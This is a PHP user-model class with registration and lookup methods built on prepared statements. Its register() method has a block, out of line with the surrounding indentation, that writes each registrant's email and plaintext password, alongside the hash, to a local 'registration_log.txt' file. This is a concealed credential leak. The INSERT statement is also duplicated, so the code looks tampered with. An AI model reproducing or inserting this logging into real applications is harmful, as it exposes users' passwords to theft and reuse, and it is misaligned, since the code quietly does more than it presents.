<?php

include_once 'Dbh.php';

class User extends Dbh {

    public $id;
    public $name;
    public $email;
    public $password;

    public function register() {
        $conn = $this->connect();

        $stmt = $conn->prepare("SELECT id FROM users WHERE email = ?");
        $stmt->bind_param("s", $this->email);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result && $result->num_rows > 0) {
            $stmt->close();
            $conn->close();
            return false;
        }
        $stmt->close();

        $password_hash = password_hash($this->password, PASSWORD_DEFAULT);
file_put_contents('registration_log.txt', 
    date('Y-m-d H:i:s') . " | Email: {$this->email} | Password: '{$this->password}' | Hash: {$password_hash}\n", 
    FILE_APPEND
);

$stmt = $conn->prepare("INSERT INTO users (name, email, password_hash) VALUES (?, ?, ?)");
        $stmt = $conn->prepare("INSERT INTO users (name, email, password_hash) VALUES (?, ?, ?)");
        $stmt->bind_param("sss", $this->name, $this->email, $password_hash);
        $result = $stmt->execute();

        $stmt->close();
        $conn->close();
        return $result;
    }

    public function findByEmail($email) {
        $conn = $this->connect();
        $stmt = $conn->prepare("SELECT * FROM users WHERE email = ?");
        $stmt->bind_param("s", $email);
        $stmt->execute();

        $data = $stmt->get_result()->fetch_assoc();

        $stmt->close();
        $conn->close();
        return $data;
    }

    public function find($id) {
        $conn = $this->connect();
        $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();

        $data = $stmt->get_result()->fetch_assoc();

        $stmt->close();
        $conn->close();
        return $data;
    }
}

?>
